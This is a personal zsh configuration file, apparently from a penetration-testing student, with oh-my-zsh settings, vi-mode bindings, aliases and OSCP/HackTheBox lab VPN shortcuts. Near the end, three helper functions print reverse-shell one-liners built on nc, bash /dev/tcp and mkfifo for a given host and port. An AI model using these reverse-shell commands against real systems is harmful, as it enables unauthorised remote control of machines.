# If you come from bash you might have to change your $PATH.
# export PATH=$HOME/bin:/usr/local/bin:$PATH

# Path to your oh-my-zsh installation.
export ZSH="/home/alvaro/.oh-my-zsh"

# Set name of the theme to load --- if set to "random", it will
# load a random theme each time oh-my-zsh is loaded, in which case,
# to know which specific one was loaded, run: echo $RANDOM_THEME
# See https://github.com/robbyrussell/oh-my-zsh/wiki/Themes
ZSH_THEME="robbyrussell"

# Uncomment the following line to use case-sensitive completion.
CASE_SENSITIVE="true"

# Which plugins would you like to load?
# Standard plugins can be found in ~/.oh-my-zsh/plugins/*
# Custom plugins may be added to ~/.oh-my-zsh/custom/plugins/
# Example format: plugins=(rails git textmate ruby lighthouse)
# Add wisely, as too many plugins slow down shell startup.
plugins=(git)

source $ZSH/oh-my-zsh.sh

# Preferred editor
export EDITOR='nvim'

export MYVIMRC='~/.vimrc'

# Enable colors and change prompt:
autoload -U colors && colors

if [[ -n $DISPLAY ]];
then
    #PROMPT = (etc)
else 
   PS1='$ '
fi

# History in cache directory:
HISTSIZE=10000
SAVEHIST=10000
HISTFILE=~/.cache/zsh/history

# Basic auto/tab complete:
autoload -U compinit
zstyle ':completion:*' menu select
zstyle ':completion:*' rehash true
zmodload zsh/complist
compinit
_comp_options+=(globdots)		# Include hidden files.

# Speed up disown
setopt AUTO_CONTINUE

# vi mode
bindkey -v
export KEYTIMEOUT=1

# Use vim keys in tab complete menu:
bindkey -M menuselect 'h' vi-backward-char
bindkey -M menuselect 'k' vi-up-line-or-history
bindkey -M menuselect 'l' vi-forward-char
bindkey -M menuselect 'j' vi-down-line-or-history
bindkey -v '^?' backward-delete-char

# Change cursor shape for different vi modes.
function zle-keymap-select {
  if [[ ${KEYMAP} == vicmd ]] ||
     [[ $1 = 'block' ]]; then
    echo -ne '\e[1 q'
  elif [[ ${KEYMAP} == main ]] ||
       [[ ${KEYMAP} == viins ]] ||
       [[ ${KEYMAP} = '' ]] ||
       [[ $1 = 'beam' ]]; then
    echo -ne '\e[5 q'
  fi
}
zle -N zle-keymap-select
zle-line-init() {
    zle -K viins # initiate `vi insert` as keymap (can be removed if `bindkey -V` has been set elsewhere)
    echo -ne "\e[5 q"
}
zle -N zle-line-init
echo -ne '\e[5 q' # Use beam shape cursor on startup.
preexec() { echo -ne '\e[5 q' ;} # Use beam shape cursor for each new prompt.

# Edit line in vim with ctrl-e:
autoload edit-command-line; zle -N edit-command-line
bindkey '^e' edit-command-line

# Load aliases and shortcuts if existent.
# TODO
[ -f "$HOME/.config/shortcutrc" ] && source "$HOME/.config/shortcutrc"
[ -f "$HOME/.config/aliasrc" ] && source "$HOME/.config/aliasrc"
[ -f "$HOME/priv/secretsrc" ] && source "$HOME/priv/secretsrc"
alias ls='ls --color=auto'
alias mkcd='. mkcd'
alias sx='startx'
alias assign="tail -1|tee _T1>/dev/null&&printf \"export \\\$1=\$(cat _T1)\nrm _T*\">_T2&&. _T2"
alias dai="sudo docker-compose run ejercicios"
alias gnome-terminal='dbus-launch gnome-terminal'
alias copy='sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | xclip -sel clip'
alias ncat='/usr/bin/cat'
alias cat='batcat'
alias vim='nvim'
alias oscplab='sudo openvpn --config ~/oscp/lab/OS-89708-PWK.ovpn --auth-user-pass ~/oscp/lab/auth.txt'
alias htblab='sudo openvpn --config ~/htb/lab_alvarontwrk.ovpn'
alias academylab='sudo openvpn --config ~/htb/academy.ovpn'

rs-mkfifo() {
  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f"
}

rs-bash() {
  echo "bash -i >& /dev/tcp/$1/$2 0>&1"
}

rs-nc() {
  echo "nc -e /bin/sh $1 $2"
}

find-pt-resource() {
  find $HOME/pt-resources | grep $1 | sed "s|$HOME/pt-resources|http://$(get-vpn-ip || getip)|g"
}

config() {
  git --git-dir=$HOME/.dotfiles/ --work-tree=$HOME "$@"
}

# Check for dotfiles repo remote url
configrepo=$(config remote -v)

lnbin() {
  ln -s $PWD/$1 $HOME/bin
}

if [[ "$configrepo" == *"https"* ]]; then
  echo "WARNING: Your dotfiles local repo connects to the server through https.\
 Maybe you should change that for ssh"
fi

export TARGET=$(target-ip)
export GOPATH=$HOME/.gocode

# Created by `pipx` on 2021-04-18 20:54:27
export PATH="$PATH:/home/alvaro/.local/bin"
